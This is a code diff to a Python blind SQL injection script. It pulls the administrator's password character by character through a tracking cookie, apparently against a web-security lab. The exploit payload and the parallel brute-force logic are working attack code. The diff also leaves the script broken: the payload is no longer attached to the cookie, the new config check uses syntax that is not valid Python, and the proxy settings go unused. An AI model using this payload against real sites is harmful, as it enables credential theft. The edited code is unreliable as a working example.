@@ -3,7 +3,8 @@ import requests
 import urllib3
 import urllib
 import asyncio
-import aiohttp 
+import aiohttp
+import json 
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -18,17 +19,13 @@ password_extracted = {}
 Get the character for a single position.
 Character is saved in the global variable "password_extracted".
 """
-async def getChar(position, url, session):
+async def getChar(position, url, session, cookies):
     for j in range(32, 126):
         #sys.stdout.write("Trying char %s at pos %s\n" % (chr(j), position))
         #sys.stdout.write("password_extracted: %s" % password_extracted)
         #sys.stdout.flush()
         sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (position, j)
         sqli_payload_encoded = urllib.parse.quote(sqli_payload)
-        cookies = {
-            "TrackingId": "B0AUqqhzPIjbglBP" + sqli_payload_encoded,
-            "session": "eCCE4KeOY143DpYnLW3n2qkEn2Us52YG"
-        }
         async with session.get(url, cookies=cookies, ssl=False) as r:
             text = await r.text()
             if "Welcome" in text:
@@ -41,10 +38,10 @@ async def getChar(position, url, session):
 Run the tasks to get the individual characters in parallel.
 Using aiohttp as asynchronous http client.
 """
-async def runParallel(url):
+async def runParallel(url, cookies):
     async with aiohttp.ClientSession() as session:
         rangeNums = list(range(1, 21))
-        tasks = [getChar(i, url, session) for i in rangeNums]
+        tasks = [getChar(i, url, session, cookies) for i in rangeNums]
         await asyncio.gather(*tasks)
 
     password = "".join(
@@ -79,15 +76,41 @@ def sqli_password(url):
                 sys.stdout.flush()
                 break
 
+"""
+Load config settings from config.json
+and run parallel character crack.
+
+Config layout:
+{
+    "TrackingId": "<tracking_id>",
+    "session": "<session>",
+    "url": "<url>",
+    "http_proxy": "<http_proxy>",
+    "https_proxy": "<https_proxy>"
+}
+"""
 def main():
-    if len(sys.argv) != 2:
-        print("(+) Usage: %s <url>" % sys.argv[0])
-        print("(+) Example: %s www.example.com" % sys.argv[0])
+    with open("config.json") as f:
+        config = json.load(f)
+        print(config)
+
+    if(!("url" in config) || !("TrackingId" in config) || !("session" in config) || !("http_proxy" in config) || !("https_proxy" in config)):
+        sys.stdout.write("(+) Use the config.json file to configure the script.\n")
+        sys.stdout.write("(+) For syntax, see the github repo.\n")
+        sys.stdout.flush()
         return
 
-    url = sys.argv[1]
+    url = config["url"]
+    cookies = {
+        "TrackingId": config["TrackingId"],
+        "session": config["session"],
+    }
+    proxies = {
+        "http": config["http_proxy"],
+        "https": config["https_proxy"]
+    }
     print("(+) Retrieving administrator password...")
-    asyncio.run(runParallel(url))
+    asyncio.run(runParallel(url, cookies))
 
 if __name__ == "__main__":
     main()
